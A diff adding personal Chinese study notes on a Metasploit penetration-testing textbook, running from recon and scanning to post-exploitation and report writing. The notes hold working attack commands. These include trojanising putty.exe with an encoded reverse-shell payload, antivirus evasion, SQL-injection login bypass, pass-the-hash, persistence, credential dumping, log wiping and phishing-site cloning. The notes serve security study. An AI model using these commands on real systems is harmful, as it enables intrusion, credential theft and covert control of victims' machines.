@@ -1,0 +1,818 @@
+# THIS IS < Lumin >'s book note of <Metasploit渗透测试 魔鬼训练营> 机械工业出版社
+
+书的source code可以从www.hzbook.com获取。
+========================================
+Vol.1 概览
+
+渗透测试，Penetration Testing。
+	这是一种通过模拟恶意攻击者的技术和方法，挫败目标系统安全控制措施，取得访问控制权限，并发现具备业务影响后果安全隐患的一种安全测试与评估方式。
+
+渗透测试的分类
+	黑盒测试 Black Box Testing/外部测试
+	白盒测试 White box Testing/内部测试 Internal testing
+	灰盒测试 Grey box Testing ，组合
+
+渗透测试方法
+	安全测试方法学开源手册 OSSTMM
+	。。
+
+渗透测试过程
+	1.客户交互。收集需求，准备计划，定义边界和目标，项目管理。
+	2.情报收集。
+	3.威胁建模。攻击策划。
+	4.漏洞分析。获取访问控制权。
+	5.渗透攻击。
+	6.后渗透攻击。
+	7.报告。
+
+漏洞分析和利用
+	安全漏洞生命周期
+		安全漏洞 Vulnerability
+		渗透代码 Exploit
+		从安全漏洞被发现到打补丁修复之前的时间段，0day
+	安全漏洞的披露方式
+	安全漏洞公共资源库
+		CNNVD
+		CNVD
+		wooyun
+		SCAP
+		CVE NVD SecurityFocus OSVDB
+
+渗透测试工具Metasploit
+	Metasploit体系框架
+		主动/被动 渗透攻击
+	空指令模块 NOP
+		在x86体系的空操作是0x90
+		典型坏字符0x00,字符串截断
+	后渗透阶段
+		Meterpreter
+	安装
+		BackTrack 5
+	run
+		msfconsole
+			e.g.
+			help
+			help search
+			search samba
+			use exploit/multi/samba/usermap_script
+			show payloads
+			show options
+			set RHOST 10.10.10.254
+			exploit
+			uname -a
+			whoami
+		msfcli
+
+===================================================
+Vol.2 渗透实验环境
+
+环境网络拓扑结构
+
+攻击机环境
+
+靶机环境
+	1. OWASP BWA
+	2. linux metasploitable
+	3. win2k3 metasploitable
+	4. XP meta...
+
+分析环境
+	Wireshark 网络抓包，协议分析
+	IDA Pro 逆向工程
+	OllyDbg 动态调试
+	Tamper Data & Hacker Web应用分析辅助插件
+
+渗透测试环境搭建
+	虚拟环境
+	网络环境
+
+=================================================
+Vol.3 情报收集
+
+外围情报搜集 OSINT
+	针对DNS和IP
+		1.whois query
+		2.nslookup 和 dig 域名查询
+		3.IP2Location 地理位置信息查询
+			比如GeoIP http://www.maxmind.com/
+			Google earth
+		4.netcraft 信息查询
+			searchdns.netcraft.com
+			toolbar.netcraft.com
+		5.IP2Domain 反查域名
+	通过搜索引擎
+		1.google hacking
+			tool ： sitedigger
+		2.搜索网站的目录结构
+			google ("parent directory site:target.com");
+			and note these files : *.inc *.bak *.txt *.sql
+			OR
+			msf > use ?dir_scanner;; set THREADS 50;; set RHOST ...;; exploit
+			and note robots.txt
+		3.检索特定文件类型
+			google "site:target.com filetype:xls"
+		4.搜索网站中的Email地址
+			msf > search search_email_collector
+		5.搜索容易存在SQL注入点的页面
+			google "site:target.com inurl:login"
+			Account = test'
+			Passwd  = test'
+			网页返回错误信息
+			 SELECT * FROM [users] WHERE username =? AND password=?
+			返回登录页
+			username = admin 'OR' 1
+			password = test 'OR' 1
+			login successful.
+	对特定目标进行外围信息搜集
+		traceroute
+
+主机探测与端口扫描
+	如果目标具有足够的防护能力，那么你的举动对方会掌握的非常清楚。
+	A.活跃主机扫描
+		1.ICMP ping
+		2.metasploit的主要发现模块
+			msf > search {arp_sweep, udp_sweep}
+		3.Nmap 主机探测
+			-Pn 不使用ICMP Ping扫描
+	B.识别目标操作系统
+		Nmap -O
+		Nmap -A
+	C.端口扫描与服务类型探测
+		扫描技术：TCP Connect, TCP SYN, TCP ACK, TCP FIN, TCP IDLE..
+		1.Metasploit端口扫描器
+			search portscan
+			一般推荐syn扫描器。
+		2.3.Nmap端口扫描以及详细信息
+			Nmap -sV
+	D.BT的AutoScan功能
+	E.扫描结果分析
+		对于SSH和samba可以进行口令猜解攻击
+		安全漏洞渗透利用
+		80和8080的Web应用漏洞
+
+服务扫描与查点
+	对端口服务的深入挖掘
+	search [SERVICE_NAME]_{version,login}
+	A.常见服务扫描
+		1.Telnet
+			search telnet_version
+		2.SSH service
+			search ssh_version
+		3.Oracle数据库 tnslsnr_version
+		4.open_proxy
+		使用OpenVPN等。
+	B.口令猜测与嗅探
+		1.SSH
+			ssh_login
+		2.psnuffle, FTP
+
+漏洞扫描
+	OpenVAS 漏洞扫描器
+		1.config
+			openvas-mkcert -q
+			openvas-mkcert-client -n om -i
+		2.update
+			oepnvas-nvt-sync
+		3.init
+			openvassd
+			openvasmd --migrate
+			openvasmd --rebuild
+		4.add user
+			openvassd -c 'add_user' -n admin -r 'Admin'
+		5.launch openvas Scanner
+			openvassd --listen=localhost --port=9391
+		6.	openvasmd --datebase=?/openvas/mgr/tasks.db --slisten=localhost --sport=9391 --listen=0.0.0.0 --port=9390
+		o.openvas-check-setup
+		访问localhost:9392
+	使用GSA
+		创建OpenVAS扫描目标
+		创建扫描任务
+		启动扫描
+	在msf中使用openvas
+		msf > load openvas
+		msf > openvas_connect admin your_password IP PORT ok
+		openvas_target_create
+		openvas_config_list
+		openvas_task_start
+		openvas_report_list
+	查找特定服务漏洞
+		OpenVAS存在如下不可避免的问题
+			1.简单粗暴。入侵检测设备反映激烈。
+			2.特殊环境中有杀伤性。可能造成网络设备瘫痪。
+			3.扫描漏报。
+		使用Nmap扫描特定漏洞
+			msf > nmap -P0 --script=smb-check-vulns IP
+			see /opt/metasploit/common/share/nmap/scripts
+	分析扫描结果
+	
+渗透测试信息以及数据库共享
+	metasploit的数据库支持 postgreql
+	nmap与渗透测试数据库
+		db_nmap
+		nmap -Pn -sV -oX dmz 10.10.10.0/24
+		msf > db_import
+
+OpenVAS与渗透测试数据库
+	pass
+
+数据库共享
+	netstat -nlp | grep postgres
+	start postgresql service
+
+===================================================================
+Vol.4 Web application penetration
+
+基础知识
+	Web应用渗透技术。Web应用存在如下特点
+	1.广泛性 2.技术门槛低 3.防火墙可绕过 4.安全机制不够成熟 5.隐蔽，无法取证。 6.变化性。 7.利益。
+	攻击发展趋势
+		XSS SQLi XCS Session CSRF SSL informationleak
+	OWASP Web 漏洞 TOP 10
+		see https://www.owasp.org/
+		1.SQL injection
+			普通注入，盲注
+		2.XSS, cross site scriping
+			e.g. http://some.site/page.html?default=French
+			实行DOM XSS攻击
+			http://.../?default=<script>
+			var url = window.location.href;
+			var pos - url.indexOf("default=") + 8;
+			var len = url.length;
+			var default_string = url.substring(pos,len);
+			document.write(unescape(default_string));
+			</script>
+		3.CSRF, cross site request forgery
+			跨站伪造请求
+			<img src = "http://www.boc.cn/trasfer.do?toAct=123456&money=10000>
+		4.BASM, broken authentication and session management 会话认证管理缺陷
+			cookie
+		5.安全误配置 Security misconfiguration
+		6.不安全密码存储 Insecure cryptographic storage
+			敏感资料未加密，使用未证明的算法，使用强度不足的算法，使用未处理的key
+		7.不安全的对象参考 Insecure direct object references
+			e.g.
+			http://www.example.com/app?filedown=../../../../etc/passwd%00
+		8.限制url访问失败
+		9.缺乏传输层保护
+		10.未验证的重定向与跳转
+
+近期案件
+	1.SONY黑客攻击
+	2.CSDN数据泄漏门
+	3.新浪微波XSS攻击
+
+msf
+	辅助模块
+		load wmap
+		help
+		wmap_sites -a http://IP
+		wmap_sites -l
+		wmap_targets -t http://ip
+		wmap_run -t
+		wmap_run -e ,look report
+		vulns
+	渗透模块
+		see outside_tools: W3AF SQLMap wXf XSSF BeEF
+
+Web应用漏洞扫描规则
+	1.开源工具
+		Arachni, Grabber-Scan, Wapiti, Zed Attack Proxy, Skipfish, W3AF, Sandcat Free Edition, Paros, Burp suit free, WATOBO
+
+	2.扫描神器w3af
+	3.sqlmap， SQL注入扫描， on msf
+	4.xss探测， msf
+	5.web app， wXf
+
+web app渗透测试
+	1.SQL注入
+		pass
+	2.xss javascript xssf
+		pass
+	3.命令注入 shell
+	4.文件包含与文件上传
+		e.g. http://some.com/?page=index.php
+		http://some.com/?page=/etc/passwd
+
+=======================================================
+Vol.5 网络服务攻击
+
+内存攻防
+	缓冲区溢出
+	比如 man 3 gets (linux) gets函数不安全。
+		栈溢出
+			示例见./stackoverflow.c
+		堆溢出
+			DWORD
+	限制条件
+		。。
+
+网络服务渗透攻击
+	针对windows
+		NetBIOS SMB MSRPC RDP
+	针对windows网络服务
+		IIS SQLserver
+	针对windows第三方
+		apache， filezilla
+	针对工业控制系统服务软件
+		Stuxnet，Duqu， Flame
+实战：MS08-067漏洞
+	漏洞安全公告
+	路径规范化
+	msf > search ms08_067
+	use
+	show payloads
+	show options
+	show targets
+	show RHOST, LPORT, LHOST, target
+	show options
+	exploit
+		ipconfig /all
+
+实战：Samba安全漏洞
+	lin与win
+		进程内存空间的布局差异
+		对程序运行过程中废弃栈的处理方式
+		系统功能调用的实现方式差异
+			linux通过int 80中断来调用系统功能
+		不同的动态链接库实现机制
+	linux服务渗透攻击
+		白盒测试
+	攻击过程
+		search chain_reply
+		use
+		show targets, options
+		exploit
+
+		简化实验，关闭地址随机化
+			echo 0 > /proc/sys/kernel/randomize_va_space
+		附加gdb到samba上
+			gdb --pid $SAMBA
+		exploit
+	ret, jmp_back
+
+==================================================================
+Vol.6 客户端渗透测试攻击
+
+特点
+	B/S C/S
+
+安全防护机制
+	1.DEP 数据执行保护
+		操作系统设置内存页属性，指明数据所在内存页不可执行。若执行则抛出异常。
+		需要CPU支持
+			Intel  Execute Disable Bit ,XD
+			AMD    No-Excute Page-Protection, NX
+	2.ASLR 地址空间布局随机化
+		
+针对浏览器的渗透攻击
+	对浏览器本身，或者其内嵌插件
+	search browser
+	堆喷射利用方式 heap spraying
+		0x0c0c0c0c
+	msf : browser_autopwn
+		meterpreter
+
+例子：MS11-050 IE浏览器
+	use-after-free漏洞
+
+针对应用软件
+	ROP，绕过DEP
+	fileformat
+
+针对office : MS10-087
+	search ms10_087
+	use
+	set payload windows/exec
+	set CMD calc.exe
+	set FILENAME ms10087.rtf
+	exploit
+	社会工程学诱骗执行
+
+例子：adobe阅读器
+	search fileformat/adobe
+
+=====================================================
+Vol.7 社会工程学
+
+攻击
+	通过分析对象的心理弱点，利用人类本能反应以及人的好奇，贪婪等。
+	Koobface
+
+技术框架
+	信息搜集
+		maltego，高度自动化的信息搜集工具
+	诱导
+		提高诱导能力
+			表现自然，学习知识，不要贪心
+		成功诱导技巧
+			迎合目标的自我感觉，表达共同兴趣，故意给出错误陈述（人们有一种无法容忍错误观点的本性），抛出诱饵信息，假装知晓，借助酒精。
+		问答种类
+			开放式（无法是或否直接回答），封闭式，诱导性，假设性。
+	托辞
+		自然简洁，合乎逻辑
+	心理影响
+		心理影响与操纵的原则
+			目标明确，建立关系，观察环境，灵活应变，认知自我。
+		基本战术
+			报答意识，义务感，相互让步，饥饿感，利用权威，利用承诺与一致性，喜好感，从众心理
+
+例子：伪装木马
+	伪装成不可执行文件的图标，捆绑伪装，组合伪装
+	木马制作
+		主要的考虑：确定监听的地址和端口，木马连回此端口，回传数据或建立通道。绑定木马于一个合法程序。确保迁移常驻进程。
+	1.生成基本的攻击载荷工具
+		# msfpayload -l | grep 'windows' | grep 'reverse_tcp' | grep 'meterpreter'
+		列出，目标平台，具有回连功能，支持后渗透。
+		# msfpayload windows/meterpreter/reverse_tcp O
+			建议修改LPORT为80,53等常用端口，LHOST为攻击机地址。
+	2.将攻击载荷绑定
+		# msfpayload -h
+		# msfencode -h
+	3.制作
+		# msfpayload /windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=80 R | \
+			msfencode -t exe -x /root/example/putty.exe -k -o putty_backdoor.exe -e x86/shikata_ga_nai -c 5
+		# ls
+	4.测试
+		# msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=80 E
+		[*] Please wait while we load the module tree...
+		在靶机上运行putty.exe
+		获得一个meterpreter会话，迁移进程到常驻进程上
+		Meterpreter > run migrate explorer.exe
+	A.木马免杀
+		加壳或者加密
+		发现目标使用了A和B安全软件，就弄下来测试
+		1.加密免杀
+			在之前的制作过程中已经用shikata_ga_nai -c 5来进行了5轮编码
+			每次生成的攻击载荷文件都不一样。多态的。
+			可以使用多种编码器进行嵌套组装，增加逃过的可能性
+			# msfpayload windows/meterpreter/reverse_tcp LHOST=10.10.10.128 LPORT=4444 R | \
+			    msfencode -e x86/shikana_ga_nai -c 5 -t raw | \
+			    msfencode -e x86/alpha_upper -c 2 -t raw |\
+			    msfencode -e x86/shikana_ga_nai -c 5 -t raw |\
+			    msfencode -e x86/countdown -c 5 -t exe -x /root/putty.exe -k -o /root/payload08.exe
+			有时候组合过于复杂会导致原程序无法正常运行，虽然逃过了安全软件。
+		2.加壳免杀
+			tool : UPX ( ultimate packer for executables )
+			tool : upx-ucl on debian
+			.# upx -6 -o putty_backdoor_upx6.exe putty_backdoor.exe
+			.# ls -l
+		3.修改特征码免杀
+			HEX直接修改法，特征码+1
+			字符串大小写修改法，大小写互换。
+			等价替换法，指令替换为功能近似的指令。
+			指令顺序调换。
+			通用跳转法。
+	B.社会工程学实施
+
+网站钓鱼
+	BT5的SET工具包。/pentest/exploits/SET
+	钓鱼网站制作
+		
+	等价替换法，指令替换为功能近似的指令。
+	指令顺序调换。
+	通用跳转法	B.社会工程学实施
+
+网站钓鱼
+	BT5的SET工具包。/pentest/exploits/SET
+	钓鱼网站制作
+		确定假冒对象网站
+		使用SET工具集
+		./set
+		选1,社会工程学攻击
+		选2,钓鱼网站攻击向量
+		选3,登录密码截取攻击
+		选2,克隆静态网站
+		输入要克隆的url， http://10.10.10.129/signin.html
+		端口准备就绪
+		访问攻击机80端口测试
+	
+邮件钓鱼
+	SET toolpack
+	社会工程学攻击 -- 针对性钓鱼邮件 -- 进行一次群发钓鱼邮件攻击 -- 选择攻击载荷6 adobe 。。。overflow -- 选定攻击载荷类型2 windows meterpreter reverse_tcp -- 选择pdf文件 -- 检查pdf内容 -- 回到SET，选择单邮箱攻击 -- 使用邮件模板 -- 输入邮件主题 -- 使用服务器或者开放代理服务器 -- 等待。
+	对方打开时，bt5收到回连的meterpreter会话
+		输入sessions
+		输入sessions -i 1
+		ps
+		发现AcroRD32.exe，看到explorer.exe 320
+		马上migrate 320.
+
+U盘社会工程学攻击
+	Hacksaw攻击
+	微博是魔鬼
+	autorun.inf
+		木马处理方式：作为系统文件，伪装成其他文件，藏于系统文件夹中，windows漏洞( mkdir runauto...\ , windows see runauto...)
+	制作hacksaw u盘，需要支持U3
+		下载hacksaw
+		确定u盘型号
+		用ultraiso写入
+		修改send.dat文件，需要gmail帐户
+		升级stunnel
+		将autorun和go.vbe隐藏
+		如果有安全设置禁止了autorun，那就只能用社会工程学诱导用户执行go.vbe文件
+	你去买一个造型卡哇伊的U盘，配上粉嫩的挂链，贴上很萌的美女小照片，很快就制作了一个U盘攻击工具。
+	如果不能诱导受害者将U盘插入电脑，一切都是徒劳。
+
+====================================================================
+Vol.8 移动环境渗透测试
+
+BYOD， Bring your own device
+	安全风险，移动设备
+
+无线网络渗透测试
+	无线网络口令破解， AP access point
+		SSID service set identification
+		MAC地址访问控制表（ACL），可以伪造MAC避开限制。
+		无线加密协议
+			WEP < WPA < WPA2
+			WPS
+		使用aircrack-ng进行密码破解
+			诺基亚N900
+			交叉编译，root权限，网卡支持监听模式
+			.# airbase-ng -c 6 -e victim -Z 4 -W 1 -F cap wlan0
+				--channel 6
+				--essid victim
+				--Z WPA2::CCMP
+				--WEP WEP flag 1
+				-F cap all to PCAP
+			.# aircrack-ng cap*.cap -w password.lst
+				qwertyuiop这中弱密码马上就破了
+		破解无线AP的管理密码
+			常见路由器，利用默认口令尝试
+				查阅主流路由器的默认登录地址，用户名和密码
+			弱口令猜测破解
+				对于web方式，WebCrack4 tool and SuperDic dictionary
+				对于SSH方式，Hydria
+				metasploit类似功能模块，search http_login, ssh_login
+					use ?http_login
+					show options
+					set RHOSTS 192.168.1.1
+					run
+					use ?ssh_login
+					show options
+					set RHOSTS 192.168.1.1
+					set USERPASS_FILE /opt/framework/msf3/data/wordlists/root_userpass.txt
+					run
+					sessions -i 1
+						uname -a;id
+			利用无线AP信息泄漏漏洞
+				确定漏洞原理
+				openwrt
+				Info.live.htm
+				search .
+
+无线案例：攻击上网本
+假冒AP攻击
+	搭建一个和目标AP一模一样的AP
+	然后关闭目标AP，客户机会重新链接到假冒AP上
+	链接USB无线网卡
+		ifconfig
+		airmon-ng start wlan0 --> tune it to monitoring mode.
+		airbase-ng -P(响应所有信号) -c 6（频道6） -a 00:0f:66:9d:*:* -C 10（每10秒发出信号） -e "dvssc" -v mon0（调试模式）
+		created tap interface at0
+		sudo apt-get install dhcp3-server
+		backup dncpd.conf
+		sudo ifconfig at0 up 192.168.1.1 netmask 255.255.255.0
+		dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
+		ps aux | grep dhcpd
+	选择Karmetasploit在假冒AP上攻击客户机
+		无线攻击套件karma在metasploit上的实现
+		加载karma.rc文件 http://metasploit.com/users/hdm/tools/karma.rc
+		msfconsole -r karma.rc
+		OR msf > resource karma.rc
+	假冒，等待
+		发现客户。
+		[*] New server process: explorer.exe (528)
+		msf > sessions -i 1
+		Meterpreter > sysinfo
+		通过仔细查看返回的信息，IMAP邮件账户都不能幸免。
+
+无线案例：智能手机
+	BYOD的特点
+	苹果渗透
+		越狱设备
+		search ios
+	Android devices
+
+============================================================
+Vol.9 俘获-Meterpreter
+
+再探Metaploit攻击载荷模块
+	典型攻击载荷模块
+		典型windows/download-exec
+	如何使用
+		show payloads
+		use ---SNIP---
+		查看载荷模块信息 info windows/exec
+		管理shellcode
+			msf > msfpayload windows/exec CMD=dir C
+		查看反汇编
+			msf > msfpayload windows/exec CMD=dir R | ndisasm -u -
+	Meterpreter优势
+		普通的payload问题：必须建立新进程，明文通信数据容易被检测到，如果在chroot下，容易对攻击者进行误导。
+		1.平台通用性
+		2.纯内存工作模式，不留痕迹于硬盘，不新建进程，避免chroot环境下的尴尬。
+		3.灵活加密的通信协议
+		4.易于扩展
+	Meterpreter命令详解
+		...exploit
+		meterpreter > help
+		basic commands
+			background --> as its name
+			sessioins --> show sessioins you catched
+			sessions -i N --> interact with session N
+			quit 
+			shell --> get a target system shell
+			irb --> interact with ruby
+				client.sys.config.sysinfo() ---> get system info
+				client.core.use("railgun") --> then you can invoke Windows API
+					client.railgun.user32.MessageBoxA(0,"hello!",NULL,MB_OK)
+					client.railgun.kernel32...
+				if you are good at windows api, it would be better.
+		filesystem commands
+			cat --> file content
+			getwd --> pwd
+			upload -h
+			download -h
+				download c:\\"program files"\\tencent\\QQ\\users\\123456789\\Msg2.0.db /etc
+			edit (vi)
+			search --> find, see search -h
+		network commands
+			ipconfig
+			portfwd --> port forward
+			netstat
+			route
+		system commands
+			ps
+			migrate --> 将meterpreter会话从一个进程移植到另一个进程的内存空间中，常用
+			execute
+			getpid
+			kill
+			getuid
+			sysinfo
+			shutdown
+
+后渗透攻击模块
+	不同于meterpreter。
+	e.g.
+	post/windows/gather/forensics/enum_drives
+	msf > use post/...
+	set SESSION 3
+	show options
+	exploit
+	OR meterpreter > run post/windows/gather/checkvm
+
+应用
+	Meterpreter只是驻留在内存中的shellcode，一旦目标重启，将失去控制权。metasploit提供了persistence和metsvc模块，安装自动和永久服务，实现长期控制。
+	meterpreter > run persistemce -X -i 5 -p 443 -r 192.168.10.141  运行该模块
+	建立meterpreter的客户端，等待后门重新连接
+		msf > use exploit/multi/handler
+		set PAYLOAD windows/meterpreter/reverse_tcp
+		set LHOST 192.168.10.141
+		set LPORT 443
+		exploit
+			sysinfo
+	meterpreter > run metsvc 以系统服务的形式安装
+	meterpreter > run getgui -u metasploit -p meterpreter 远程桌面
+		note that, 脚本生成了/root/.msf4/logs/scripts/getgui/clean_up*用于清理痕迹，关闭服务，清理帐号
+		meterpreter > run ...rc
+
+	权限提升
+		getsystem -h
+			getuid --> get a admin
+			getsystem
+			getuid --> get SYSTEM, highest.
+		use vulns
+	信息窃取
+		dumplink
+			run post/windows/gather/dumplink --> 查看最近的系统操作，访问文件记录等
+		enum_applications module
+	口令获取和利用
+		利用网络嗅探
+			meterpreter > use sniffer
+			help
+			sniffer_interfaces
+			sniffer_start 1
+			sniffer_dump 1 /tmp/xpsp1.cap
+			sniffer_stop 1
+		利用浏览器进行
+			enum_ie module
+			meterpreter > run ...
+		系统口令获取
+			meterpreter > hashdump
+			OR smart_hashdump ,need SYSTEM
+			meter > run windows/gather/smart_hashdump
+			法一使用 L0phtCrack等破解工具，john等
+			法二直接进行重放利用，msf::psexec，利用获取的hash进行传递攻击
+		内网扩展
+			1.添加路由
+				meter > run get_local_subnets
+				background
+				msf > route add 192.168.10.0 255.255.255.0 1
+				route print
+			2.scan port 445
+				msf > use auxiliary/scanner/portscan/tcp
+				set RHOSTS 192.168.10.0/25
+				set PORTS 445
+				run
+			3.attack
+				msf > use exploit/windows/smb/psexec
+				set payload windows/meterpreter/reverse_tcp
+				set LHOST 10.10.10.128
+				set LPORT 443
+				set RHOST 192.168.10.2
+				set SMBPass <_HASH_>
+				exploit
+		消除踪迹
+			1.clearev
+			2.timestomp
+
+===============================================================
+Vol.10 实战
+
+黑客夺旗竞赛
+
+Defcon CTF
+
+add
+	看看服务端口由什么进程占用
+		# lsof -i -P | grep LISTEN
+	渗透测试师，安全研究者，白帽黑客，黑帽黑客
+
+=========================================================
+Appendix 如何攒写渗透测试报告
+
+1.结构
+	执行摘要 executive summary
+	技术性报告 technical report
+	最后结果和结论
+
+2.执行摘要
+	背景 background
+	整体情况 overall posture
+	风险评估和轮廓 risk ranking/ profile
+	结果概要 general findings
+	改进建议概要 recommendation summary
+	应对策略路线 strategic roadmap
+
+3.技术性报告
+	introduction 引言
+		客户组织与渗透着名单
+		联系方式
+		渗透涉及资产
+		目标
+		范围
+		力度限制
+		测试方法
+		威胁与风险评估
+	information gathering 信息搜集
+		被动搜集和主动搜集的情报
+		企业情报
+		个人情报
+	vulnerability assessment 漏洞评估
+		安全漏洞分类等级
+		技术性安全漏洞
+		逻辑性安全漏洞
+	exploitation/vulnerability confirmation 渗透攻击/漏洞确认
+		时间线
+		目标资产
+		渗透行为
+			直接与间接攻击
+	post exploitation 后渗透攻击
+		特权提升路径及技术
+		客户定义关键信息获取
+		业务信息价值
+		关键业务系统的访问
+		对受保护数据的访问
+		访问到的另外信息/系统
+		长期控制能力
+		静默入侵与撤离的能力
+		安全防范措施的有效性验证
+			检测能力：防火墙/WAF/IPS/IDS，人，DLP，日志
+			应急相应有效性
+	risk/exposure 风险/披露
+		计算安全事件频率
+		每次安全事件损失数量级
+		推导风险，基于威胁，漏洞与安全防范的措施
+
+4.结论
+	
+5.MindMap图
+
+======================
+Appendix reference
+
+metasploit.com
+wireshark.org
+nmap.org
+owasp.org
+ The Art of Human Hacking : Social Engineering
+..
+
+===================================
+--------DONE----------
+==================================
+
+
+TODO :
+assembly x86_64
+缓冲区溢出原理
